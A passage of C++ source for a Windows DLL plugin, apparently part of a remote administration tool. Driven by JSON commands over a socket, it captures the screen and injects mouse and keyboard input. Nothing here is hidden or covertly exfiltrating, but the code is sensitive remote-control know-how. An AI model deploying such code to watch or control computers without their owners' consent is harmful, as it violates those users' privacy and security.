        g_monitorIndex = safeMonitorIndex;
        g_scalePercent = scalePercent;
        g_targetFps = targetFps;
        g_captureFormat = format;
        g_captureRect = monitors[(size_t)safeMonitorIndex].rect;
        g_hasCaptureRect = true;
    }

    if (!g_captureRunning.exchange(true)) {
        if (g_captureThread.joinable())
            g_captureThread.join();
        g_captureThread = thread(capture_loop);
    }

    json response;
    response["action"] = "monitorstatus";
    response["status"] = "started";
    response["monitor"] = safeMonitorIndex;
    response["scale"] = scalePercent;
    response["fps"] = targetFps;
    safe_send_json(sock, response);
}

static void simulate_mouse(const string& event, int button, int x, int y) {
    RECT rect{};
    {
        lock_guard<mutex> lock(g_captureMutex);
        if (!g_hasCaptureRect) return;
        rect = g_captureRect;
    }

    int screen_x = rect.left + MulDiv(x, rect.right - rect.left, 65535);
    int screen_y = rect.top + MulDiv(y, rect.bottom - rect.top, 65535);

    int v_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int v_top = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int v_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int v_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (v_width <= 0 || v_height <= 0) return;

    double fx = (double)(screen_x - v_left) * (65535.0 / (double)(v_width - 1));
    double fy = (double)(screen_y - v_top) * (65535.0 / (double)(v_height - 1));

    INPUT input = {0};
    input.type = INPUT_MOUSE;
    input.mi.dx = (LONG)fx;
    input.mi.dy = (LONG)fy;
    input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;

    if (event == "move") {
        input.mi.dwFlags |= MOUSEEVENTF_MOVE;
    } else if (event == "down") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN;
    } else if (event == "up") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTUP;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTUP;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP;
    }

    SendInput(1, &input, sizeof(INPUT));
}

static void simulate_key(const string& event, int vk) {
    INPUT input = {0};
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (WORD)vk;
    if (event == "up") {
        input.ki.dwFlags = KEYEVENTF_KEYUP;
    }
    SendInput(1, &input, sizeof(INPUT));
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    send_monitor_list(sock);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");

        if (action == "monitorlist") {
            send_monitor_list(sock);
            return;
        }

        if (action == "monitorstart") {
            int monitor = command.value("monitor", 0);
            int scale = command.value("scale", 50);
            int fps = command.value("fps", 0);
            int format = command.value("format", 2); // Default to H.264 (2)
            start_capture(sock, monitor, scale, fps, format);
            return;
        }

        if (action == "monitorstop") {
            stop_capture_thread();

            json response;
            response["action"] = "monitorstatus";
            response["status"] = "stopped";
            safe_send_json(sock, response);
            return;
        }

        if (action == "mouseevent") {
            string event = command.value("event", "");
            int button = command.value("button", 0);
            int x = command.value("x", 0);
            int y = command.value("y", 0);
            simulate_mouse(event, button, x, y);
            return;
        }

        if (action == "keyevent") {
            string event = command.value("event", "");
            int vk = command.value("key", 0);
            simulate_key(event, vk);
            return;
        }

        send_monitor_error(sock, "Unknown monitoring action");
    } catch (const std::exception& e) {
        send_monitor_error(sock, string("Command parse failed: ") + e.what());
    } catch (...) {
        send_monitor_error(sock, "Command parse failed");
    }
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning.store(false);
        CleanupEncoder();
        shutdown_gdiplus();
    }
    return TRUE;
}
